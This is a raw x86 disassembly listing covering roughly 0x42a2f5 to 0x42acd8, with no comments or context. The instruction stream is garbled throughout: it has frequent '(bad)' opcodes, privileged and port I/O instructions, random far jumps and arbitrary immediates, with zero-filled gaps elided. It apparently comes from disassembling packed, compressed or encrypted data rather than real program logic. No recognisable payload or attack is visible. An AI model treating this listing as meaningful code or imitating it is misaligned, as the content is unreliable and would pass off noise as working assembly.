  42a2f5:	cli    
  42a2f6:	sbb    BYTE PTR [edi+0x40],dh
  42a2f9:	mov    es,ebp
  42a2fb:	iret   
  42a2fc:	loopne 0x42a2f4
  42a2fe:	inc    ebx
  42a2ff:	rol    DWORD PTR [edx+0x42294e89],cl
  42a305:	fstp   QWORD PTR [ecx-0x8]
  42a308:	dec    ecx
  42a309:	push   ecx
  42a30a:	bound  eax,QWORD PTR [esi+0xb]
  42a30d:	jbe    0x42a2f6
  42a30f:	cdq    
  42a310:	icebp  
  42a311:	mov    esi,DWORD PTR [ebp+edx*2+0x25]
  42a315:	sar    al,1
  42a317:	inc    edx
  42a318:	ret    
  42a319:	push   ss
  42a31a:	jmp    0x42a2fc
  42a31c:	dec    ebx
  42a31d:	aam    0x2c
  42a31f:	stos   BYTE PTR es:[edi],al
  42a320:	jecxz  0x42a37e
  42a322:	inc    eax
  42a323:	aam    0xfc
  42a325:	mov    al,ds:0x59b720c5
  42a32a:	sub    eax,0x361fed3f
  42a32f:	into   
  42a330:	int    0xd5
  42a332:	add    BYTE PTR [ecx-0x5d],dh
	...
  42a395:	add    BYTE PTR [edi+0xe],bh
  42a398:	jne    0x42a3d5
  42a39a:	jne    0x42a417
  42a39c:	jg     0x42a3ec
  42a39e:	ds loop 0x42a3ca
  42a3a1:	retf   0x3160
  42a3a4:	popf   
  42a3a5:	repnz outs dx,DWORD PTR ds:[esi]
  42a3a7:	ret    
  42a3a8:	add    DWORD PTR [eax],eax
  42a3aa:	pop    es
  42a3ab:	add    DWORD PTR [eax],eax
  42a3ad:	add    BYTE PTR [eax-0x40],ah
  42a3b0:	test   BYTE PTR [eax],dl
  42a3b2:	or     eax,0x30c66de6
  42a3b7:	add    ebx,0xffffffdd
  42a3ba:	dec    esi
  42a3bb:	dec    ebx
  42a3bc:	mov    eax,0x3d0ef09b
  42a3c1:	test   DWORD PTR [edx-0x1741ae8f],edx
  42a3c7:	imul   edx,DWORD PTR [edx],0x14016175
  42a3cd:	bound  esp,QWORD PTR [esi-0x284c8eee]
  42a3d3:	cmp    eax,0x90eba899
  42a3d8:	lods   eax,DWORD PTR ds:[esi]
  42a3d9:	(bad)  
  42a3da:	mov    eax,0x5e631a13
  42a3df:	ret    0xea0a
  42a3e2:	mov    edx,edi
  42a3e4:	das    
  42a3e5:	out    dx,al
  42a3e6:	mov    bl,BYTE PTR [esi+0x2454a60d]
  42a3ec:	aad    0x48
  42a3ee:	inc    edi
  42a3ef:	clc    
  42a3f0:	mov    gs,WORD PTR [ecx-0x56141e29]
  42a3f6:	hlt    
  42a3f7:	pop    DWORD PTR [ecx]
  42a3f9:	outs   dx,BYTE PTR ds:[esi]
  42a3fa:	push   ecx
  42a3fb:	cmp    ebp,DWORD PTR [edx+0x6]
  42a3fe:	xchg   ecx,eax
  42a3ff:	in     eax,0x7
  42a401:	cmp    BYTE PTR [ebp-0x6e04f3a5],0x68
  42a408:	push   esi
  42a409:	push   esp
  42a40a:	xchg   esi,ebx
  42a40c:	mov    ch,BYTE PTR [ecx-0x15ef029e]
  42a412:	pop    eax
  42a413:	aad    0xa
  42a415:	mov    eax,0x39070573
  42a41a:	ss jmp 0x42a3c0
  42a41d:	les    ebx,FWORD PTR [edx-0x6]
  42a420:	and    dh,BYTE PTR [eax+0x2e9779e5]
  42a426:	jae    0x42a425
  42a428:	sbb    dl,BYTE PTR [esi]
  42a42a:	(bad)  
  42a42b:	or     DWORD PTR [ecx+eax*8+0x6e6fa6dd],ebx
  42a432:	stos   BYTE PTR es:[edi],al
  42a433:	mov    BYTE PTR [ebp+edi*4+0x3aa0be66],cl
  42a43a:	call   DWORD PTR [esi+ebp*1+0x708277ee]
  42a441:	add    BYTE PTR ds:0xc505535e,bl
  42a447:	jmp    0x7639b151
  42a44c:	loop   0x42a431
  42a44e:	cmp    BYTE PTR [ecx-0x1],0xe5
  42a452:	adc    DWORD PTR es:[edx+0x6e06ed6d],eax
  42a459:	dec    edi
  42a45a:	sbb    DWORD PTR [ecx-0x3e334d73],ebp
  42a460:	out    dx,eax
  42a461:	lods   al,BYTE PTR ds:[esi]
  42a462:	push   ecx
  42a463:	mov    ds:0xab93b433,eax
  42a468:	push   0xfffffff3
  42a46a:	stos   BYTE PTR es:[edi],al
  42a46b:	rol    DWORD PTR [ecx],0x8d
  42a46e:	pop    eax
  42a46f:	ins    DWORD PTR es:[edi],dx
  42a470:	add    BYTE PTR [ebx-0x6a7dc62c],dh
  42a476:	pushf  
  42a477:	fldcw  WORD PTR [ebx+0xf922040]
  42a47d:	add    eax,0xbe9ffbe0
  42a482:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a483:	cdq    
  42a484:	pop    es
  42a485:	loop   0x42a42a
  42a487:	xchg   edx,eax
  42a488:	adc    BYTE PTR [eax-0x409b39c8],cl
  42a48e:	sbb    BYTE PTR ds:0x29c52c9b,dh
  42a494:	mov    edx,0xc19d521e
  42a499:	lods   eax,DWORD PTR ds:[esi]
  42a49a:	xchg   esi,eax
  42a49b:	jmp    0x42a4ac
  42a49d:	mov    eax,ebx
  42a49f:	shr    BYTE PTR [edi],0xe1
  42a4a2:	arpl   WORD PTR [edx-0x17dfb7a6],di
  42a4a8:	aam    0x2d
  42a4aa:	jecxz  0x42a51a
  42a4ac:	retf   0xdd5b
  42a4af:	int    0x24
  42a4b1:	mov    esi,edi
  42a4b3:	cmp    ebp,DWORD PTR [ecx]
	...
  42a515:	add    BYTE PTR [eax],bl
  42a517:	dec    edi
  42a518:	pop    ss
  42a519:	mov    ecx,0xefbef957
  42a51e:	mov    cl,0xd7
  42a520:	dec    ebp
  42a521:	add    dl,BYTE PTR [eax+0x768a9f4a]
  42a527:	les    eax,FWORD PTR [ecx]
  42a529:	add    BYTE PTR [edi],al
  42a52b:	add    DWORD PTR [eax],eax
  42a52d:	add    BYTE PTR [ebp+0x3e],cl
  42a530:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a531:	ds sbb eax,0xda5b8a5c
  42a537:	icebp  
  42a538:	jnp    0x42a57b
  42a53a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a53b:	jno    0x42a4f5
  42a53d:	dec    ebp
  42a53e:	cmp    eax,0x1cfc9322
  42a543:	repnz aas 
  42a545:	std    
  42a546:	cld    
  42a547:	repnz mov bl,BYTE PTR [ebp+0x12]
  42a54b:	fidivr DWORD PTR [ecx]
  42a54d:	xchg   edi,eax
  42a54e:	lahf   
  42a54f:	and    BYTE PTR es:[edx-0x78],dl
  42a553:	repnz mov WORD PTR [eax],es
  42a556:	sti    
  42a557:	lock pop si
  42a55a:	es mov ah,0x1a
  42a55d:	inc    esp
  42a55e:	cld    
  42a55f:	xchg   esi,eax
  42a560:	and    BYTE PTR [ebx],ch
  42a562:	retf   0xd4d7
  42a565:	inc    esp
  42a566:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a567:	pusha  
  42a568:	nop
  42a569:	ins    DWORD PTR es:[edi],dx
  42a56a:	push   ds
  42a56b:	aaa    
  42a56c:	cmp    BYTE PTR [ebx+0x4849c509],ah
  42a572:	xchg   ecx,eax
  42a573:	sahf   
  42a574:	xor    BYTE PTR [esi+ecx*1-0x58],al
  42a578:	or     ecx,0xffffff92
  42a57b:	push   es
  42a57c:	repnz pop ebp
  42a57e:	mov    ebp,0xae756f31
  42a583:	test   eax,0x86a51248
  42a588:	pop    edi
  42a589:	cmp    DWORD PTR [ebx-0x585e5b00],esi
  42a58f:	icebp  
  42a590:	test   eax,0x840f3d7b
  42a595:	jae    0x42a5d4
  42a597:	mov    eax,ds:0x2a849490
  42a59c:	ret    0x42d1
  42a59f:	xor    eax,0xbe7ddf7b
  42a5a4:	fcomp  QWORD PTR [eax+0xa029843]
  42a5aa:	add    eax,eax
  42a5ac:	inc    ebp
  42a5ad:	push   0x8c97237b
  42a5b2:	retf   0xaba0
  42a5b5:	lea    edx,[edi-0x5991a685]
  42a5bb:	or     bh,BYTE PTR [edx]
  42a5bd:	aam    0x9c
  42a5bf:	ret    
  42a5c0:	mov    DWORD PTR [ebp+0x2c],eax
  42a5c3:	outs   dx,DWORD PTR ds:[esi]
  42a5c4:	je     0x42a5fe
  42a5c6:	xchg   esi,eax
  42a5c7:	aam    0x4a
  42a5c9:	jp     0x42a632
  42a5cb:	mov    eax,ds:0x78af4e79
  42a5d0:	lods   al,BYTE PTR ds:[esi]
  42a5d1:	rcr    DWORD PTR [ecx],0x81
  42a5d4:	mov    bl,0xcc
  42a5d6:	jmp    0x686b:0xb7bb4ee1
  42a5dd:	adc    BYTE PTR [edx+0x21],bl
  42a5e0:	lds    ebx,FWORD PTR [eax-0x7664cdf8]
  42a5e6:	sub    DWORD PTR [ebx-0x43],edx
  42a5e9:	aas    
  42a5ea:	fwait
  42a5eb:	pop    edx
  42a5ec:	or     dl,BYTE PTR ss:[ecx]
  42a5ef:	pop    esp
  42a5f0:	sbb    eax,0x2e45527c
  42a5f5:	aam    0x25
  42a5f7:	pop    ss
  42a5f8:	pop    edx
  42a5f9:	sti    
  42a5fa:	(bad)  
  42a5fb:	outs   dx,BYTE PTR ds:[esi]
  42a5fc:	dec    edi
  42a5fd:	inc    ecx
  42a5fe:	sub    al,0xb6
  42a600:	sbb    eax,0xbfbd779
  42a605:	scas   al,BYTE PTR es:[edi]
  42a606:	in     eax,0xc1
  42a608:	mov    DWORD PTR [ecx-0x7a],esp
  42a60b:	ret    0x839b
  42a60e:	or     DWORD PTR [edx+0x5edf94f9],ebx
  42a614:	jns    0x42a68d
  42a616:	inc    ecx
  42a617:	leave  
  42a618:	imul   edi,DWORD PTR [esp+edx*2+0x540fbf22],0x14
  42a620:	sub    ch,BYTE PTR [ebx+eax*4+0x72f7eda7]
  42a627:	mov    cl,0x67
  42a629:	bnd jbe 0x42a61b
  42a62c:	and    eax,0x32485814
  42a631:	pop    ebx
  42a632:	jae    0x42a678
  42a634:	test   BYTE PTR [eax],0x0
	...
  42a693:	add    BYTE PTR [eax],al
  42a695:	add    BYTE PTR [esi+edx*1],ah
  42a698:	outs   dx,BYTE PTR ds:[esi]
  42a699:	(bad)  
  42a69a:	jle    0x42a69b
  42a69c:	lods   eax,DWORD PTR ds:[esi]
  42a69d:	test   DWORD PTR [edi],0x6d67323b
  42a6a3:	push   ds
  42a6a4:	aaa    
  42a6a5:	push   0x1c57d
  42a6aa:	pop    es
  42a6ab:	add    DWORD PTR [eax],eax
  42a6ad:	add    BYTE PTR [edi-0x431d1366],bh
  42a6b3:	add    esi,0x43677d84
  42a6b9:	sti    
  42a6ba:	js     0x42a6c1
  42a6bc:	vmovlps xmm6,xmm5,QWORD PTR [eax]
  42a6c0:	out    0xb3,al
  42a6c2:	mov    al,ds:0xf55fe8eb
  42a6c7:	imul   edi,DWORD PTR [edx+ebp*8-0x71],0x1d
  42a6cc:	mov    dh,0xe
  42a6ce:	retf   
  42a6cf:	cwde   
  42a6d0:	pop    esp
  42a6d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a6d3:	push   0xffffffd9
  42a6d5:	xchg   BYTE PTR ds:0xfc15c34a,ch
  42a6db:	xchg   esp,eax
  42a6dc:	and    edx,ebp
  42a6de:	inc    edx
  42a6df:	cmc    
  42a6e0:	int3   
  42a6e1:	fisubr DWORD PTR [edx]
  42a6e3:	aad    0xeb
  42a6e5:	adc    eax,0x1bd6cffb
  42a6ea:	nop
  42a6eb:	fs xchg ebx,eax
  42a6ed:	adc    ah,BYTE PTR [ecx]
  42a6ef:	sub    al,0xd3
  42a6f1:	pop    edx
  42a6f2:	push   es
  42a6f3:	sbb    DWORD PTR [edx-0x736a3b04],eax
  42a6f9:	leave  
  42a6fa:	mov    eax,ds:0x6b0d3bbd
  42a6ff:	pop    eax
  42a700:	adc    eax,0x51704a8
  42a705:	sbb    bl,BYTE PTR [edi+0x3b188866]
  42a70b:	or     DWORD PTR [eax+0x2c2f1d0b],ebx
  42a711:	dec    ecx
  42a712:	fild   DWORD PTR [ebp-0x1601dc78]
  42a718:	adc    eax,0xcae85fa
  42a71d:	outs   dx,BYTE PTR ds:[esi]
  42a71e:	aad    0x19
  42a720:	sub    dl,BYTE PTR [edi]
  42a722:	js     0x42a753
  42a724:	cli    
  42a725:	jle    0x42a6c9
  42a727:	jno    0x42a726
  42a729:	shl    DWORD PTR [eax+0x5a],cl
  42a72c:	pusha  
  42a72d:	aaa    
  42a72e:	mov    cl,BYTE PTR [eax-0x31efc3fb]
  42a734:	pop    ecx
  42a735:	fdiv   QWORD PTR [edx]
  42a737:	lock retf 0x282
  42a73b:	retf   0xce5e
  42a73e:	aam    0xf1
  42a740:	jle    0x42a78b
  42a742:	push   cs
  42a743:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a745:	xchg   ebx,eax
  42a746:	out    dx,al
  42a747:	leave  
  42a748:	pop    ebp
  42a749:	ret    0xfd21
  42a74c:	and    eax,0x10dd1cc8
  42a751:	mov    ch,0xd1
  42a753:	lds    eax,FWORD PTR [ebx]
  42a755:	mov    al,0x29
  42a757:	lahf   
  42a758:	push   esi
  42a759:	pop    ebp
  42a75a:	mov    ds:0x40e2ff41,al
  42a75f:	mov    ch,0x5
  42a761:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a762:	out    dx,eax
  42a763:	sbb    esp,DWORD PTR [eax+0x5b]
  42a766:	cmp    ebp,DWORD PTR [esi+0x348b16ad]
  42a76c:	sbb    al,0x66
  42a76e:	mov    dh,0xaa
  42a770:	mov    esi,ebx
  42a772:	inc    edi
  42a773:	xlat   BYTE PTR ds:[ebx]
  42a774:	cmp    ebp,DWORD PTR [edx-0x5e]
  42a777:	inc    ebx
  42a778:	(bad)  
  42a779:	fcomp  QWORD PTR ds:0x5d20cf4d
  42a77f:	cmc    
  42a780:	push   esi
  42a781:	inc    esp
  42a782:	add    al,0x2f
  42a784:	lea    ebx,[edi+0x792cf91b]
  42a78a:	mov    ds:0x29066d39,al
  42a78f:	or     BYTE PTR [eax+0x2e07c873],bl
  42a795:	inc    ecx
  42a796:	gs xchg edi,eax
  42a798:	xchg   esi,eax
  42a799:	lea    ebx,[edi+0x337050e2]
  42a79f:	mov    ebx,0xda4dcb1c
  42a7a4:	test   BYTE PTR [eax],cl
  42a7a6:	clc    
  42a7a7:	je     0x42a794
  42a7a9:	sub    ebx,DWORD PTR [ebx+edx*2]
  42a7ac:	pushf  
  42a7ad:	call   DWORD PTR [edi]
  42a7af:	in     al,dx
  42a7b0:	dec    esp
  42a7b1:	pop    eax
  42a7b2:	add    BYTE PTR ss:[eax],cl
	...
  42a815:	add    BYTE PTR [edx-0x10409c9b],cl
  42a81b:	mov    edi,0x497a75de
  42a820:	arpl   WORD PTR [ebx],sp
  42a822:	mov    DWORD PTR [eax],ebp
  42a824:	mov    al,ds:0x1c6843f
  42a829:	add    BYTE PTR [edi],al
  42a82b:	add    DWORD PTR [eax],eax
  42a82d:	add    BYTE PTR [ecx+0x4f],bl
  42a830:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a831:	ss pop ebx
  42a833:	(bad)  
  42a834:	sub    edx,DWORD PTR [esp+edx*2+0x61]
  42a838:	scas   al,BYTE PTR es:[edi]
  42a839:	sub    ah,BYTE PTR [eax]
  42a83b:	jl     0x42a819
  42a83d:	out    dx,al
  42a83e:	add    ah,BYTE PTR [ebx-0x6]
  42a841:	jae    0x42a808
  42a843:	xchg   bp,ax
  42a845:	inc    eax
  42a846:	mov    ds:0xc7063117,al
  42a84b:	sub    DWORD PTR [edi+0x595f5cd9],eax
  42a851:	push   cs
  42a852:	adc    edi,DWORD PTR [edi]
  42a854:	and    DWORD PTR [esi],edx
  42a856:	dec    ebp
  42a857:	push   cs
  42a858:	dec    esp
  42a859:	jmp    0xc066:0xcfa38cc9
  42a860:	into   
  42a861:	mov    eax,DWORD PTR [edi+ecx*1+0x4c9c7844]
  42a868:	xor    dl,BYTE PTR [ecx+edx*8]
  42a86b:	inc    esi
  42a86c:	xchg   DWORD PTR [ebx-0x3d],edx
  42a86f:	test   eax,0xa4be8718
  42a874:	(bad)  
  42a876:	push   esi
  42a877:	gs pop ebx
  42a879:	cli    
  42a87a:	ret    
  42a87b:	scas   eax,DWORD PTR es:[edi]
  42a87c:	dec    edi
  42a87d:	pop    ds
  42a87e:	mov    dl,0xa8
  42a880:	shr    edi,cl
  42a882:	jnp    0x42a886
  42a884:	cmp    dl,BYTE PTR [esi+esi*1]
  42a887:	mov    al,BYTE PTR [eax]
  42a889:	in     eax,dx
  42a88a:	pop    edi
  42a88b:	es push ebp
  42a88d:	stos   BYTE PTR es:[edi],al
  42a88e:	lahf   
  42a88f:	div    edx
  42a891:	shl    esi,1
  42a893:	xchg   esp,eax
  42a894:	sub    BYTE PTR [edx-0x4c],al
  42a897:	sbb    eax,0x58c5da00
  42a89c:	jo     0x42a88c
  42a89e:	mov    esi,0x6ec1312e
  42a8a3:	retf   0x6169
  42a8a6:	sbb    DWORD PTR [edx-0x56],ebx
  42a8a9:	test   eax,0xb0a95e23
  42a8ae:	push   ebx
  42a8af:	xor    DWORD PTR [ebp-0xb],ecx
  42a8b2:	add    eax,0xb0ce4f6f
  42a8b8:	arpl   WORD PTR [eax-0x6091dbe3],dx
  42a8be:	outs   dx,BYTE PTR ds:[esi]
  42a8bf:	jmp    0xa5af4eaf
  42a8c4:	sbb    DWORD PTR gs:[ebx-0x44],ecx
  42a8c8:	(bad)  
  42a8c9:	in     al,0x84
  42a8cb:	int    0x6c
  42a8cd:	popf   
  42a8ce:	cmp    DWORD PTR [esi+0x12258452],0x23566ac0
  42a8d8:	dec    esi
  42a8d9:	iret   
  42a8da:	ret    
  42a8db:	(bad)  
  42a8dc:	xchg   ebx,eax
  42a8dd:	pop    edi
  42a8de:	mov    dl,0x40
  42a8e0:	test   BYTE PTR [ecx],ah
  42a8e2:	push   0x61
  42a8e4:	add    ebp,esp
  42a8e6:	std    
  42a8e7:	dec    ecx
  42a8e8:	and    eax,0xe28ca3f4
  42a8ed:	fstp   QWORD PTR [edi+0x3f365b8d]
  42a8f3:	imul   ecx,DWORD PTR [ebp+ebp*4+0x2f],0xa854ff9a
  42a8fb:	or     bl,BYTE PTR [eax+0x6e]
  42a8fe:	mov    ds,ecx
  42a900:	out    0x23,eax
  42a902:	and    BYTE PTR [edx],0x95
  42a905:	sub    BYTE PTR fs:[edi+0x52],bh
  42a909:	das    
  42a90a:	push   edi
  42a90b:	mov    edi,0x7582fe2a
  42a910:	in     eax,0x11
  42a912:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a913:	mov    esi,esp
  42a915:	mov    ebp,esp
  42a917:	jmp    0x42a8a0
  42a919:	stos   DWORD PTR es:[edi],eax
  42a91a:	retf   
  42a91b:	xor    cl,BYTE PTR [ebp-0x1087f49c]
  42a921:	or     al,0x58
  42a923:	xchg   esi,eax
  42a924:	pop    esi
  42a925:	in     al,0x7
  42a927:	(bad)  
  42a928:	outs   dx,DWORD PTR ds:[esi]
  42a929:	ret    0x4877
  42a92c:	ret    
  42a92d:	mov    edx,0x78f9181d
  42a932:	not    ebx
  42a934:	mov    eax,0x0
	...
  42a995:	add    BYTE PTR [eax+0x3fee1d93],ch
  42a99b:	out    dx,al
  42a99c:	sti    
  42a99d:	xlat   BYTE PTR ds:[ebx]
  42a99e:	push   esi
  42a99f:	aam    0xbc
  42a9a1:	or     ebx,DWORD PTR [ebp+0x1]
  42a9a4:	repnz mov ebp,0x1c78b
  42a9aa:	pop    es
  42a9ab:	add    DWORD PTR [eax],eax
  42a9ad:	add    cl,ch
  42a9af:	xchg   edi,eax
  42a9b0:	scas   eax,DWORD PTR es:[edi]
  42a9b1:	ret    0xe4e4
  42a9b4:	jbe    0x42a9d0
  42a9b6:	mov    DWORD PTR [ebx+ebx*4-0x58],esi
  42a9ba:	outs   dx,BYTE PTR ds:[esi]
  42a9bb:	(bad)  
  42a9bc:	or     BYTE PTR [esi],ch
  42a9be:	loopne 0x42a99b
  42a9c0:	dec    edx
  42a9c1:	aaa    
  42a9c2:	leave  
  42a9c3:	mov    bl,0xfa
  42a9c5:	add    edx,ebp
  42a9c7:	add    BYTE PTR [ebx+0x29c4a852],ah
  42a9cd:	sahf   
  42a9ce:	dec    edx
  42a9cf:	cmp    ecx,DWORD PTR [eax+eax*1]
  42a9d2:	stos   BYTE PTR es:[edi],al
  42a9d3:	pop    ebp
  42a9d4:	cmp    eax,0xf57de9e8
  42a9d9:	ret    
  42a9da:	mov    eax,0x485ad7f9
  42a9df:	and    eax,0xb3e053d
  42a9e4:	pop    ss
  42a9e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a9e6:	fiadd  DWORD PTR ds:[eax+0x474a3047]
  42a9ed:	lds    edx,FWORD PTR [ecx+ecx*1+0xc]
  42a9f1:	fld    DWORD PTR [ecx-0x6e]
  42a9f4:	adc    eax,0x802cb2af
  42a9f9:	call   0x6d46:0xa9048e91
  42aa00:	mov    ecx,0x127803ef
  42aa05:	xchg   esp,eax
  42aa06:	add    ch,BYTE PTR [edx+0x27]
  42aa09:	sbb    al,dh
  42aa0b:	test   ch,0x23
  42aa0e:	iret   
  42aa0f:	jl     0x42aa7a
  42aa11:	cli    
  42aa12:	jle    0x42a9cb
  42aa14:	xor    eax,0xf6ccf8dd
  42aa19:	dec    esp
  42aa1a:	jecxz  0x42aa5f
  42aa1c:	sbb    DWORD PTR [bx+si-0x6d],esp
  42aa20:	jbe    0x42aa58
  42aa22:	and    edx,DWORD PTR [ecx-0x61]
  42aa25:	inc    edx
  42aa26:	(bad)  
  42aa27:	and    DWORD PTR [eax-0x6756897a],ebx
  42aa2d:	js     0x42aa09
  42aa2f:	ins    BYTE PTR es:[edi],dx
  42aa30:	and    ecx,edx
  42aa32:	mov    ds:0x52dd1307,al
  42aa37:	and    ecx,0xfffffffb
  42aa3a:	sbb    ah,dl
  42aa3c:	bnd jmp 0x15a508d0
  42aa42:	adc    BYTE PTR [edi-0x16],dh
  42aa45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aa46:	dec    ecx
  42aa47:	lock push ds
  42aa49:	adc    BYTE PTR [ecx+ecx*1+0x15],0xae
  42aa4e:	adc    BYTE PTR [ecx],al
  42aa50:	int    0xe4
  42aa52:	loop   0x42aa4d
  42aa54:	push   0xcf730a93
  42aa59:	sbb    DWORD PTR [esi+0x1a],edi
  42aa5c:	rcr    BYTE PTR [edi],0x40
  42aa5f:	mov    al,ds:0x8f8f39a7
  42aa64:	adc    esp,edx
  42aa66:	push   0xf4935cee
  42aa6b:	fcomp  DWORD PTR [esi+0x3]
  42aa6e:	xor    BYTE PTR [edx-0x23],ch
  42aa71:	inc    ebx
  42aa72:	repnz xor eax,0x91437485
  42aa78:	push   0x38
  42aa7a:	xor    eax,0xfcd4d33
  42aa7f:	lahf   
  42aa80:	rcl    DWORD PTR [ecx],1
  42aa82:	mov    al,ds:0x8336575e
  42aa87:	mov    esp,0x4ec87886
  42aa8c:	mov    cl,0x2b
  42aa8e:	imul   esp,DWORD PTR [edx-0x1f],0xffffffc0
  42aa92:	mov    dl,0x27
  42aa94:	sbb    bl,BYTE PTR [edx-0x24]
  42aa97:	fsubr  st(6),st
  42aa99:	data16 sub cl,BYTE PTR [esi-0x35]
  42aa9d:	sub    al,0x7d
  42aa9f:	retf   
  42aaa0:	or     ch,BYTE PTR fs:[ecx]
  42aaa3:	xchg   edx,eax
  42aaa4:	ss push edx
  42aaa6:	mov    ecx,eax
  42aaa8:	xor    ebx,esp
  42aaaa:	xor    edx,edx
  42aaac:	dec    eax
  42aaad:	dec    esp
  42aaae:	xor    DWORD PTR cs:[edi],esi
  42aab1:	cdq    
  42aab2:	jb     0x42aa97
  42aab4:	adc    al,BYTE PTR [eax]
	...
  42ab16:	ds push cs
  42ab18:	sub    al,0x5d
  42ab1a:	cmp    al,0x7f
  42ab1c:	jg     0x42ab8d
  42ab1e:	dec    eax
  42ab1f:	das    
  42ab20:	pop    edi
  42ab21:	mov    DWORD PTR [edx-0x6d03b806],esp
  42ab27:	enter  0x1,0x7
  42ab2b:	add    DWORD PTR [eax],eax
  42ab2d:	add    BYTE PTR [eax],bl
  42ab2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ab30:	mov    ecx,0xe272c92c
  42ab35:	mov    dh,0x67
  42ab37:	mov    edx,0x88954cdb
  42ab3c:	cmp    al,0x25
  42ab3e:	cmp    edx,edx
  42ab40:	icebp  
  42ab41:	mov    ah,bh
  42ab43:	shl    BYTE PTR [ecx-0x4c7e64bd],1
  42ab49:	lods   eax,DWORD PTR ds:[esi]
  42ab4a:	mov    ?,WORD PTR [esi]
  42ab4c:	sub    eax,0x2cde4df1
  42ab51:	ror    DWORD PTR [ebx+ecx*1+0x6c],cl
  42ab55:	cdq    
  42ab56:	(bad)  
  42ab57:	lods   al,BYTE PTR ds:[esi]
  42ab58:	pop    edi
  42ab59:	mov    edi,0xd10fbc8b
  42ab5e:	das    
  42ab5f:	sub    BYTE PTR [ecx],cl
  42ab61:	inc    ecx
  42ab62:	mov    ebx,0xf55effbe
  42ab67:	(bad)  
  42ab68:	in     eax,dx
  42ab69:	xor    dh,BYTE PTR [eax+0x5]
  42ab6c:	aam    0x6b
  42ab6e:	add    eax,ecx
  42ab70:	xor    eax,0xfca5571c
  42ab75:	test   al,0xf4
  42ab77:	xchg   edi,eax
  42ab78:	push   0xfc28638a
  42ab7d:	xor    al,0x2f
  42ab7f:	pop    ds
  42ab80:	mov    bl,0xa8
  42ab82:	mul    DWORD PTR [ecx]
  42ab84:	fisttp WORD PTR [edx+0xa1c0e9d]
  42ab8a:	mov    ds:0x96b5a7e0,al
  42ab8f:	fdivp  st(3),st
  42ab91:	cli    
  42ab92:	int    0x7f
  42ab94:	fisttp QWORD PTR ds:0xe687124c
  42ab9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ab9b:	out    0xcb,eax
  42ab9d:	add    BYTE PTR [edx],dl
  42ab9f:	shl    DWORD PTR [edx+0x4f],cl
  42aba2:	jae    0x42ac14
  42aba4:	inc    edi
  42aba5:	aas    
  42aba6:	xchg   ecx,eax
  42aba7:	imul   edi,DWORD PTR [ecx*4-0x27518adb],0xaa67bfe0
  42abb2:	repz cs in al,dx
  42abb5:	popa   
  42abb6:	aas    
  42abb7:	xchg   edx,eax
  42abb8:	(bad)  
  42abb9:	fdiv   DWORD PTR [ebx+eiz*4-0x3c]
  42abbd:	sahf   
  42abbe:	sbb    eax,0x33991b7d
  42abc3:	cmc    
  42abc4:	cdq    
  42abc5:	cwde   
  42abc6:	test   ebp,edx
  42abc8:	mov    al,ds:0xe714b2f8
  42abcd:	push   ebp
  42abce:	cdq    
  42abcf:	mov    eax,ds:0xe44ca28e
  42abd4:	pushf  
  42abd5:	jmp    0x42ab7e
  42abd7:	xor    DWORD PTR [eax-0x2291cafb],esi
  42abdd:	mov    esi,0xd1b5599f
  42abe2:	sbb    edi,DWORD PTR [esp+edx*1-0x50fc9582]
  42abe9:	adc    eax,0x30039942
  42abee:	xchg   ebp,eax
  42abef:	out    dx,eax
  42abf0:	dec    edx
  42abf1:	pop    ds
  42abf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42abf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42abf4:	mov    DWORD PTR [edi+edx*8+0x3b],edx
  42abf8:	xchg   ecx,eax
  42abf9:	(bad)  
  42abfa:	and    eax,0x309fd528
  42abff:	or     al,0x79
  42ac01:	adc    eax,0x337a1959
  42ac06:	sbb    bl,BYTE PTR [edx]
  42ac08:	es xchg ecx,eax
  42ac0a:	xlat   BYTE PTR ds:[ebx]
  42ac0b:	inc    edx
  42ac0c:	pushaw 
  42ac0e:	push   esi
  42ac0f:	test   BYTE PTR [edx+0x3580e5a0],0x1d
  42ac16:	inc    edx
  42ac17:	popa   
  42ac18:	cmp    BYTE PTR [ebx+ebx*4-0x3b],dh
  42ac1c:	gs jge 0x42ac7c
  42ac1f:	or     eax,0x6ffcdba9
  42ac24:	mov    cl,0xf6
  42ac26:	xchg   ebp,eax
  42ac27:	xchg   ecx,eax
  42ac28:	cmp    cl,BYTE PTR [eax+0x5b6daea8]
  42ac2e:	push   esp
  42ac2f:	adc    eax,0x342f0cef
  42ac34:	add    BYTE PTR ds:[eax],al
	...
  42ac93:	add    BYTE PTR [eax],al
  42ac95:	add    cl,ch
  42ac97:	xor    bl,BYTE PTR [edx+edi*1]
  42ac9a:	fistp  QWORD PTR [esi]
  42ac9c:	out    dx,eax
  42ac9d:	repz rcl BYTE PTR [edi+0xaf0a59],cl
  42aca4:	and    al,0x5d
  42aca6:	cdq    
  42aca7:	leave  
  42aca8:	add    DWORD PTR [eax],eax
  42acaa:	pop    es
  42acab:	add    DWORD PTR [eax],eax
  42acad:	add    ch,ah
  42acaf:	div    BYTE PTR [edx-0x208ac64]
  42acb5:	cs and al,0x63
  42acb8:	ja     0x42ac51
  42acba:	loope  0x42ac81
  42acbc:	cwde   
  42acbd:	scas   al,BYTE PTR es:[edi]
  42acbe:	bound  ebx,QWORD PTR [ecx+ebx*2]
  42acc1:	xchg   BYTE PTR [eax],dh
  42acc3:	lock lods eax,DWORD PTR ds:[esi]
  42acc5:	not    ebx
  42acc7:	cmp    ch,dl
  42acc9:	retf   
  42acca:	ror    DWORD PTR [esi+0x33c39a91],0xd2
  42acd1:	loop   0x42acb5
  42acd3:	scas   al,BYTE PTR es:[edi]
  42acd4:	je     0x42acb8
  42acd6:	mov    bl,0x4
  42acd8:	cmp    DWORD PTR [esi+ebx*2],esi
